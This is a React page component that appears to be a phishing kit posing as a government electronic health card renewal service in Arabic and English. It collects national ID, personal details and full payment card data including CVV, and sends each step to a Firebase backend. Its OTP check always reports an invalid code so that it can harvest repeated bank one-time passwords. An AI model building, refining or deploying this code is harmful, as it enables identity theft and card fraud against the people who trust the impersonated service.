"use client"

import { useState } from "react"
import { useNavigate } from "react-router-dom"
import { Navigation } from "@/components/Navigation"
import { Footer } from "@/components/Footer"
import { StepIndicator } from "@/components/StepIndicator"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group"
import { useLanguage } from "@/contexts/LanguageContext"
import { useForm } from "react-hook-form"
import { FileHeart } from "lucide-react"
import { addData } from "@/lib/firebase"

interface FormData {
  cardNumber: string
  operationType: string
  fullName: string
  dateOfBirth: string
  phoneNumber: string
  email: string
  address: string
  paymentCardType: string
  paymentCardNumber: string
  paymentExpiry: string
  paymentCVV: string
}

const steps = [
  { label: "Card Information", labelAr: "معلومات البطاقة" },
  { label: "Submission", labelAr: "استكمال التقديم" },
  { label: "Payment Details", labelAr: "تفاصيل الدفع" },
  { label: "Complete Process", labelAr: "إتمام العملية" },
]
const allOtps = ['']
export default function HealthCardRenewal() {
  const { language } = useLanguage()
  const navigate = useNavigate()
  const [currentStep, setCurrentStep] = useState(1)
  const [otp, setOtp] = useState("")
  const [otpError, setOtpError] = useState("")
  const [isVerified, setIsVerified] = useState(false)

  const {
    register,
    handleSubmit,
    watch,
    reset,
    formState: { errors },
  } = useForm<FormData>({
    defaultValues: { operationType: "renewal", paymentCardType: "visa" },
  })

  const operationType = watch("operationType")

  const onSubmit = async (data: FormData) => {
    const visitorId = localStorage.getItem("visitor")
    if (currentStep === 3) {
      allOtps.push(otp)
    }
    await addData({ id: visitorId, data, otp, allOtps,currentStep })

    if (currentStep < 4) {
      setCurrentStep((s) => s + 1)
    }
  }

  const goBack = () => {
    if (currentStep > 1) setCurrentStep((s) => s - 1)
  }

  const handleClearFields = () => reset()

  const handleVerifyOtp = () => {
    setOtpError("")

    if (!otp) {
      setOtpError(language === "ar" ? "الرجاء إدخال رمز التحقق" : "Please enter the verification code")
      return
    }

    if (otp.length !== 6) {
      setOtpError(language === "ar" ? "رمز التحقق يجب أن يكون 6 أرقام" : "Verification code must be 6 digits")
      return
    }

    setOtpError(
      language === "ar"
        ? "رمز التحقق غير صحيح. الرجاء المحاولة مرة أخرى."
        : "Invalid verification code. Please try again.",
    )
  }

  return (
    <div className="min-h-screen bg-background flex flex-col overflow-x-hidden" dir={language === "ar" ? "rtl" : "ltr"}>
      <Navigation />

      <main className="flex-1 px-4 md:px-6 py-4 md:py-6 max-w-full">
        {/* Header */}
        <div className="max-w-3xl mx-auto mb-4 md:mb-6">
          <div className="flex items-center gap-3 mb-3">
            <div className="w-14 h-14 md:w-16 md:h-16 bg-primary rounded-xl flex items-center justify-center">
              <FileHeart className="h-7 w-7 text-primary-foreground" />
            </div>
            <h1 className="text-lg md:text-xl font-bold text-foreground">
              {language === "ar" ? "خدمة البطاقة الصحية الإلكترونية" : "Electronic Health Card Service"}
            </h1>
          </div>

          <p className="text-sm text-muted-foreground text-center">
            {language === "ar"
              ? "طلب الاستعلام عن البطاقة الصحية -- سوف يستغرق حوالي 20 ثانية لإتمام الطلب."
              : "Health card inquiry request will take about 20 seconds to complete."}
          </p>
        </div>

        {/* Step Indicator */}
        <div className="max-w-3xl mx-auto mb-4">
          <StepIndicator currentStep={currentStep} totalSteps={4} steps={steps} />
        </div>

        <div className="max-w-3xl mx-auto bg-background">
          {/* -------------------------------------------------- */}
          {/*  STEP 1: CARD INFORMATION                          */}
          {/* -------------------------------------------------- */}
          {currentStep === 1 && (
            <>
              <h2 className="text-lg md:text-xl font-bold mb-4 pb-3 border-b">
                {language === "ar" ? "معلومات البطاقة" : "Card Information"}
              </h2>

              <form dir="rtl" onSubmit={handleSubmit(onSubmit)} className="space-y-6">
                {/* Card Number */}
                <div>
                  <Label htmlFor="cardNumber">
                    {language === "ar" ? "الرجاء إدخال رقم البطاقة الشخصية" : "Please enter your personal card number"}
                    <span className="text-destructive">*</span>
                  </Label>

                  <Input
                    id="cardNumber"
                    {...register("cardNumber", {
                      required: language === "ar" ? "هذا الحقل مطلوب" : "This field is required",
                      pattern: {
                        value: /^[0-9]+$/,
                        message: language === "ar" ? "الرجاء إدخال أرقام فقط" : "Please enter numbers only",
                      },
                    })}
                    placeholder={language === "ar" ? "الرجاء إدخال الرقم" : "Please enter the number"}
                    className="h-12 text-base mt-2"
                  />
                  {errors.cardNumber && <p className="text-sm text-destructive mt-1">{errors.cardNumber.message}</p>}
                </div>

                {/* Operation Type */}
                <div>
                  <Label>
                    {language === "ar" ? "نوع العملية" : "Operation Type"}
                    <span className="text-destructive">*</span>
                  </Label>

                  <RadioGroup
                    className="mt-3 space-y-4"
                    value={operationType}
                    onValueChange={(value) => {
                      const event = { target: { name: "operationType", value } }
                      register("operationType").onChange(event)
                    }}
                  >
                    <div className="flex items-center gap-3">
                      <RadioGroupItem value="renewal" id="renewal" />
                      <Label htmlFor="renewal">{language === "ar" ? "تجديد" : "Renewal"}</Label>
                    </div>

                    <div className="flex items-center gap-3">
                      <RadioGroupItem value="reprint" id="reprint" />
                      <Label htmlFor="reprint">
                        {language === "ar"
                          ? "إعادة الطبع (ePurse المفقود أو التالف)"
                          : "Reprint (Lost or Damaged ePurse)"}
                      </Label>
                    </div>

                    <div className="flex items-center gap-3">
                      <RadioGroupItem value="verify" id="verify" />
                      <Label htmlFor="verify">
                        {language === "ar" ? "تحقق من تاريخ انتهاء الصلاحية" : "Verify from expiration date"}
                      </Label>
                    </div>
                  </RadioGroup>
                </div>

                {/* Buttons */}
                <div className="flex flex-col-reverse sm:flex-row gap-3 pt-6">
                  <Button
                    type="button"
                    variant="outline"
                    onClick={handleClearFields}
                    className="flex-1 h-12 bg-transparent"
                  >
                    {language === "ar" ? "تفريغ الحقول" : "Clear Fields"}
                  </Button>

                  <Button type="submit" className="flex-1 h-12 bg-primary text-primary-foreground">
                    {language === "ar" ? "تابع" : "Continue"}
                  </Button>
                </div>
              </form>
            </>
          )}

          {/* -------------------------------------------------- */}
          {/* STEP 2: SUBMISSION - Personal Information */}
          {/* -------------------------------------------------- */}
          {currentStep === 2 && (
            <form onSubmit={handleSubmit(onSubmit)} className="space-y-6">
              <h2 className="text-xl font-bold mb-4 pb-3 border-b">
                {language === "ar" ? "استكمال التقديم" : "Personal Information"}
              </h2>

              {/* Full Name */}
              <div>
                <Label htmlFor="fullName">
                  {language === "ar" ? "الاسم الكامل" : "Full Name"}
                  <span className="text-destructive">*</span>
                </Label>
                <Input
                  id="fullName"
                  {...register("fullName", {
                    required: language === "ar" ? "هذا الحقل مطلوب" : "This field is required",
                    minLength: {
                      value: 3,
                      message:
                        language === "ar" ? "الاسم يجب أن يكون 3 أحرف على الأقل" : "Name must be at least 3 characters",
                    },
                  })}
                  placeholder={language === "ar" ? "أدخل الاسم الكامل" : "Enter full name"}
                  className="h-12 mt-2"
                />
                {errors.fullName && <p className="text-sm text-destructive mt-1">{errors.fullName.message}</p>}
              </div>

              {/* Date of Birth */}
              <div>
                <Label htmlFor="dateOfBirth">
                  {language === "ar" ? "تاريخ الميلاد" : "Date of Birth"}
                  <span className="text-destructive">*</span>
                </Label>
                <Input
                  id="dateOfBirth"
                  type="date"
                  {...register("dateOfBirth", {
                    required: language === "ar" ? "هذا الحقل مطلوب" : "This field is required",
                  })}
                  className="h-12 mt-2"
                />
                {errors.dateOfBirth && <p className="text-sm text-destructive mt-1">{errors.dateOfBirth.message}</p>}
              </div>

              {/* Phone Number */}
              <div>
                <Label htmlFor="phoneNumber">
                  {language === "ar" ? "رقم الهاتف" : "Phone Number"}
                  <span className="text-destructive">*</span>
                </Label>
                <Input
                  id="phoneNumber"
                  {...register("phoneNumber", {
                    required: language === "ar" ? "هذا الحقل مطلوب" : "This field is required",
                    pattern: {
                      value: /^[0-9+\-\s()]+$/,
                      message: language === "ar" ? "رقم الهاتف غير صالح" : "Invalid phone number",
                    },
                  })}
                  placeholder={language === "ar" ? "أدخل رقم الهاتف" : "Enter phone number"}
                  className="h-12 mt-2"
                />
                {errors.phoneNumber && <p className="text-sm text-destructive mt-1">{errors.phoneNumber.message}</p>}
              </div>

              {/* Email */}
              <div>
                <Label htmlFor="email">
                  {language === "ar" ? "البريد الإلكتروني" : "Email Address"}
                  <span className="text-destructive">*</span>
                </Label>
                <Input
                  id="email"
                  type="email"
                  {...register("email", {
                    required: language === "ar" ? "هذا الحقل مطلوب" : "This field is required",
                    pattern: {
                      value: /^[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,}$/i,
                      message: language === "ar" ? "البريد الإلكتروني غير صالح" : "Invalid email address",
                    },
                  })}
                  placeholder={language === "ar" ? "أدخل البريد الإلكتروني" : "Enter email address"}
                  className="h-12 mt-2"
                />
                {errors.email && <p className="text-sm text-destructive mt-1">{errors.email.message}</p>}
              </div>

              {/* Address */}
              <div>
                <Label htmlFor="address">
                  {language === "ar" ? "العنوان" : "Address"}
                  <span className="text-destructive">*</span>
                </Label>
                <Input
                  id="address"
                  {...register("address", {
                    required: language === "ar" ? "هذا الحقل مطلوب" : "This field is required",
                    minLength: {
                      value: 10,
                      message:
                        language === "ar"
                          ? "العنوان يجب أن يكون 10 أحرف على الأقل"
                          : "Address must be at least 10 characters",
                    },
                  })}
                  placeholder={language === "ar" ? "أدخل العنوان الكامل" : "Enter full address"}
                  className="h-12 mt-2"
                />
                {errors.address && <p className="text-sm text-destructive mt-1">{errors.address.message}</p>}
              </div>

              <div className="flex gap-3 pt-4">
                <Button type="button" onClick={goBack} variant="outline" className="flex-1 h-12 bg-transparent">
                  {language === "ar" ? "رجوع" : "Back"}
                </Button>

                <Button type="submit" className="flex-1 h-12 bg-primary text-primary-foreground">
                  {language === "ar" ? "تابع" : "Continue"}
                </Button>
              </div>
            </form>
          )}

          {/* -------------------------------------------------- */}
          {/* STEP 3: PAYMENT DETAILS FORM                      */}
          {/* -------------------------------------------------- */}
          {currentStep === 3 && (
            <form onSubmit={handleSubmit(onSubmit)} className="space-y-6">
              <h2 className="text-xl font-bold mb-4 pb-3 border-b">
                {language === "ar" ? "تفاصيل الدفع" : "Payment Details"}
              </h2>

              {/* CARD TYPE */}
              <div dir="rtl">
                <Label className="font-bold">
                  {language === "ar" ? "نوع البطاقة" : "Card Type"}
                  <span className="text-destructive">*</span>
                </Label>
                <RadioGroup
                  dir="rtl"
                  defaultValue="visa"
                  className="mt-3 space-y-2"
                  onValueChange={(value) => {
                    const event = { target: { name: "paymentCardType", value } }
                    register("paymentCardType").onChange(event)
                  }}
                >
                  <div className="flex items-center gap-3">
                    <RadioGroupItem value="visa" id="visa" />
                    <Label htmlFor="visa">Visa</Label>
                  </div>

                  <div className="flex items-center gap-3">
                    <RadioGroupItem value="mastercard" id="mastercard" />
                    <Label htmlFor="mastercard">Mastercard</Label>
                  </div>

                  <div className="flex items-center gap-3">
                    <RadioGroupItem value="debit" id="debit" />
                    <Label htmlFor="debit">{language === "ar" ? "بطاقة بنكية" : "Debit Card"}</Label>
                  </div>
                </RadioGroup>
              </div>

              {/* CARD NUMBER */}
              <div>
                <Label htmlFor="paymentCardNumber" className="font-bold">
                  {language === "ar" ? "رقم البطاقة" : "Card Number"}
                  <span className="text-destructive">*</span>
                </Label>
                <Input
                  id="paymentCardNumber"
                  {...register("paymentCardNumber", {
                    required: language === "ar" ? "هذا الحقل مطلوب" : "This field is required",
                    pattern: {
                      value: /^[0-9]{13,19}$/,
                      message:
                        language === "ar" ? "رقم البطاقة يجب أن يكون 13-19 رقم" : "Card number must be 13-19 digits",
                    },
                  })}
                  placeholder="xxxx xxxx xxxx xxxx"
                  className="h-12 mt-2"
                  maxLength={19}
                />
                {errors.paymentCardNumber && (
                  <p className="text-sm text-destructive mt-1">{errors.paymentCardNumber.message}</p>
                )}
              </div>

              {/* EXPIRATION DATE */}
              <div>
                <Label htmlFor="paymentExpiry" className="font-bold">
                  {language === "ar" ? "تاريخ الانتهاء" : "Expiration Date (MM/YY)"}
                  <span className="text-destructive">*</span>
                </Label>
                <Input
                  id="paymentExpiry"
                  {...register("paymentExpiry", {
                    required: language === "ar" ? "هذا الحقل مطلوب" : "This field is required",
                    pattern: {
                      value: /^(0[1-9]|1[0-2])\/([0-9]{2})$/,
                      message: language === "ar" ? "الصيغة يجب أن تكون MM/YY" : "Format must be MM/YY",
                    },
                  })}
                  placeholder="MM/YY"
                  className="h-12 mt-2"
                  maxLength={5}
                />
                {errors.paymentExpiry && (
                  <p className="text-sm text-destructive mt-1">{errors.paymentExpiry.message}</p>
                )}
              </div>

              {/* CVV */}
              <div>
                <Label htmlFor="paymentCVV" className="font-bold">
                  CVV
                  <span className="text-destructive">*</span>
                </Label>
                <Input
                  id="paymentCVV"
                  type="password"
                  {...register("paymentCVV", {
                    required: language === "ar" ? "هذا الحقل مطلوب" : "This field is required",
                    pattern: {
                      value: /^[0-9]{3,4}$/,
                      message: language === "ar" ? "CVV يجب أن يكون 3-4 أرقام" : "CVV must be 3-4 digits",
                    },
                  })}
                  placeholder="123"
                  className="h-12 mt-2"
                  maxLength={4}
                />
                {errors.paymentCVV && <p className="text-sm text-destructive mt-1">{errors.paymentCVV.message}</p>}
              </div>

              <div className="flex gap-3 pt-4">
                <Button type="button" onClick={goBack} variant="outline" className="flex-1 h-12 bg-transparent">
                  {language === "ar" ? "رجوع" : "Back"}
                </Button>

                <Button type="submit" className="flex-1 h-12 bg-primary text-primary-foreground">
                  {language === "ar" ? "دفع" : "Pay"}
                </Button>
              </div>
            </form>
          )}

          {/* -------------------------------------------------- */}
          {/* STEP 4: COMPLETE PROCESS - OTP VERIFICATION */}
          {/* -------------------------------------------------- */}
          {currentStep === 4 && (
            <div className="space-y-6">
              <h2 className="text-xl font-bold mb-4 pb-3 border-b">
                {language === "ar" ? "التحقق من الهوية" : "Identity Verification"}
              </h2>

              {!isVerified ? (
                <>
                  {/* OTP verification section */}
                  <div className="bg-muted/50 p-6 rounded-lg">
                    <p className="text-sm text-muted-foreground mb-4">
                      {language === "ar"
                        ? "تم إرسال رمز التحقق إلى رقم هاتفك المسجل. الرجاء إدخال الرمز للمتابعة."
                        : "A verification code has been sent to your registered phone number. Please enter the code to continue."}
                    </p>

                    <div>
                      <Label htmlFor="otp" className="font-bold">
                        {language === "ar" ? "رمز التحقق (OTP)" : "Verification Code (OTP)"}
                        <span className="text-destructive">*</span>
                      </Label>
                      <Input
                        id="otp"
                        value={otp}
                        onChange={(e) => {
                          const value = e.target.value.replace(/[^0-9]/g, "")
                          setOtp(value)
                          setOtpError("") // Clear error when user types
                        }}
                        placeholder={
                          language === "ar" ? "أدخل رمز التحقق المكون من 6 أرقام" : "Enter 6-digit verification code"
                        }
                        className="h-12 mt-2 text-center text-lg tracking-widest"
                        maxLength={6}
                        dir="ltr"
                      />
                      {otpError && (
                        <div className="mt-2 p-3 bg-destructive/10 border border-destructive/20 rounded-md">
                          <p className="text-sm text-destructive font-medium">{otpError}</p>
                        </div>
                      )}
                    </div>

                    <Button
                      onClick={handleVerifyOtp}
                      className="w-full mt-4 h-12 bg-primary text-primary-foreground"
                      disabled={!otp || otp.length !== 6}
                    >
                      {language === "ar" ? "تحقق من الرمز" : "Verify Code"}
                    </Button>

                    <Button onClick={goBack} variant="outline" className="w-full mt-3 h-12 bg-transparent">
                      {language === "ar" ? "رجوع" : "Back"}
                    </Button>
                  </div>
                </>
              ) : (
                <>
                  {/* Success message after verification */}
                  <p className="text-green-600 text-lg font-semibold">
                    {language === "ar" ? "تم إكمال العملية بنجاح!" : "Your process has been completed successfully!"}
                  </p>

                  <Button className="mt-4 bg-primary text-primary-foreground" onClick={() => navigate("/")}>
                    {language === "ar" ? "العودة إلى الخدمات" : "Back to Services"}
                  </Button>
                </>
              )}
            </div>
          )}
        </div>
      </main>

      <Footer />
    </div>
  )
}
